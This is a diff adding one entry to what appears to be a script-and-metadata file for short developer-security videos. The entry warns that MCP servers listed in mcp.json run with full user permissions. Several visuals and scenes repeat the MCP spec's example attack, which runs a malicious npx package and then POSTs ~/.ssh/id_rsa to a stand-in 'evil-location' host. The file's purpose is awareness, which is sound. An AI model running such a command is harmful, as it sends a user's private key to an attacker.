@@ -11142,5 +11142,223 @@
         "id": "18154613815540823"
       }
     ]
+  },
+  {
+    "id": 109,
+    "style": "light",
+    "payoff": "An MCP server entry in your config runs commands with your full user permissions, so the spec's own malicious-command example can read and send files like your SSH key.",
+    "kicker": "Myth vs fact #24",
+    "hook": "Safe plugin, then *full access*",
+    "hook_type": "before_after",
+    "hook_visual": {
+      "type": "code",
+      "title": "mcp.json",
+      "language": "json",
+      "code": "{ \"mcpServers\": { \"files\": {\n  \"command\": \"npx\",\n  \"args\": [\n    \"@modelcontextprotocol/\n     server-filesystem\"\n  ]\n}}}",
+      "highlight": [
+        2,
+        4,
+        5
+      ]
+    },
+    "alternatives": [
+      {
+        "hook": "Your MCP server isn't *sandboxed*",
+        "spoken": "[urgent] That MCP server entry in your config (break) [serious] runs with your full user permissions.",
+        "hook_type": "mistake"
+      },
+      {
+        "hook": "Your *npx* install isn't isolated",
+        "hook_type": "problem",
+        "spoken": "[urgent] Adding an MCP server means that npx command (break) [serious] runs with your full access."
+      },
+      {
+        "hook": "We *tested* MCP's own warning",
+        "hook_type": "test",
+        "spoken": "[confident and fast] We checked MCP's own docs for what a server (break) [serious] can really do."
+      }
+    ],
+    "points": [
+      {
+        "title": "Just a command",
+        "body": "Config only names what gets run",
+        "visual": [
+          {
+            "type": "code",
+            "title": "mcp.json",
+            "language": "json",
+            "code": "{ \"mcpServers\": { \"files\": {\n  \"command\": \"npx\",\n  \"args\": [\n    \"@modelcontextprotocol/\n     server-filesystem\"\n  ]\n}}}",
+            "highlight": [
+              2,
+              4,
+              5
+            ]
+          }
+        ]
+      },
+      {
+        "title": "Runs as you",
+        "body": "Spec says same privileges as the client",
+        "visual": [
+          {
+            "type": "screenshot",
+            "url": "https://modelcontextprotocol.io/specification/2025-06-18/basic/security_best_practices",
+            "find": "same privileges as the client"
+          },
+          {
+            "type": "code",
+            "title": "mcp.json",
+            "language": "json",
+            "code": "{ \"mcpServers\": { \"files\": {\n  \"command\": \"npx\",\n  \"args\": [\n    \"@modelcontextprotocol/\n     server-filesystem\"\n  ]\n}}}",
+            "highlight": [
+              2
+            ]
+          }
+        ]
+      },
+      {
+        "title": "Reads your keys",
+        "body": "The spec's own malicious example",
+        "visual": [
+          {
+            "type": "terminal",
+            "commands": [
+              "npx malicious-package",
+              "curl -X POST -d @~/.ssh/id_rsa \\",
+              "  https://example.com/evil-location"
+            ]
+          },
+          {
+            "type": "code",
+            "title": "spec's own example",
+            "language": "bash",
+            "code": "npx malicious-package && \\\ncurl -X POST \\\n  -d @~/.ssh/id_rsa \\\n  https://example.com/evil-location",
+            "highlight": [
+              1,
+              3
+            ]
+          }
+        ]
+      }
+    ],
+    "cta": "Know a dev who trusts every *npx* install?",
+    "caption": "MCP server security risks in Claude Code and other AI coding tools\nThe config looks harmless but runs with your full system permissions\nWould you still add that server without checking it first? 👇",
+    "hashtags": [
+      "#mcp",
+      "#claudecode",
+      "#devsecurity",
+      "#npm",
+      "#aitools"
+    ],
+    "voiceover": [
+      "[grinning, punchy] It looks like a harmless plugin install (break) [urgent] but it runs with your permissions.",
+      "[matter-of-fact] It just names a command to run.",
+      "[serious] The spec says it runs with your permissions.",
+      "[alarmed] That one line can grab your SSH key.",
+      "[warm, curious] Send this to the dev who trusts every npx install."
+    ],
+    "sources": [
+      "https://modelcontextprotocol.io/specification/2025-06-18/basic/security_best_practices"
+    ],
+    "scenes": [
+      {
+        "kind": "code",
+        "title": "mcp.json",
+        "language": "json",
+        "code": "{ \"mcpServers\": { \"files\": {\n  \"command\": \"npx\",\n  \"args\": [\n    \"@modelcontextprotocol/\n     server-filesystem\"\n  ]\n}}}",
+        "highlight": [
+          2,
+          4,
+          5
+        ]
+      },
+      {
+        "kind": "file",
+        "title": "mcp.json",
+        "lines": [
+          "\"command\": \"npx\"",
+          "\"args\": [\"@modelcontextprotocol/\"",
+          "  \"server-filesystem\"]"
+        ],
+        "strike": false,
+        "tag": "LOOKS SAFE",
+        "at": "command"
+      },
+      {
+        "kind": "docs",
+        "url": "https://modelcontextprotocol.io/specification/2025-06-18/basic/security_best_practices",
+        "title": "Security Best Practices",
+        "text": "MCP servers run with the same privileges as the client",
+        "mark": "same privileges as the client",
+        "at": "permissions"
+      },
+      {
+        "kind": "code",
+        "title": "the real example",
+        "language": "bash",
+        "code": "npx malicious-package && \\\ncurl -X POST \\\n  -d @~/.ssh/id_rsa \\\n  https://example.com/evil-location",
+        "highlight": [
+          1,
+          3
+        ],
+        "accent": true,
+        "at": "key"
+      },
+      {
+        "kind": "words",
+        "lines": [
+          "Who trusts",
+          "*every* npx?"
+        ],
+        "motif": "brackets"
+      }
+    ],
+    "test": {
+      "name": "topic",
+      "arm": "ai_tool"
+    },
+    "reveal": 3,
+    "pillar": "relatable",
+    "series": "Myth vs fact",
+    "episode": 24,
+    "posted_at": "2026-11-01T21:04:28+00:00",
+    "media_id": "18125401786895786",
+    "review": {
+      "first_frame": {
+        "ok": true,
+        "problem": ""
+      },
+      "payoff": {
+        "ok": true,
+        "problem": ""
+      },
+      "scores": {
+        "hook": 8,
+        "phone_readability": 8,
+        "motion": 8,
+        "polish": 7
+      },
+      "metrics": {
+        "blank_frames": 0,
+        "first_blank_at": null,
+        "loop_seam": 27.7
+      }
+    },
+    "shown": [
+      "code",
+      "code",
+      "screenshot",
+      "code",
+      "text"
+    ],
+    "slot": 3,
+    "seconds": 17.9,
+    "youtube_id": "p_ICCcm3Y40",
+    "stories": [
+      {
+        "kind": "teaser",
+        "id": "18161372122512738"
+      }
+    ]
   }
 ]
